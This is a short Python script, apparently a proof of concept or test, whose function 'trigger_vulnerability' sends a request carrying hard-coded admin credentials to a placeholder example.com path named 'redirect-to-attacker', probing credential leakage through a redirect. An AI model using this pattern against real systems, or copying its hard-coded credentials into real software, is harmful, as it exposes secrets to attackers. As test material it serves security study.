import requests

def trigger_vulnerability():
    target_url = "http://example.com/redirect-to-attacker"
    response = requests.get(target_url, auth=('admin', 'secret_password'))
    return response.status_code

if __name__ == "__main__":
    trigger_vulnerability()
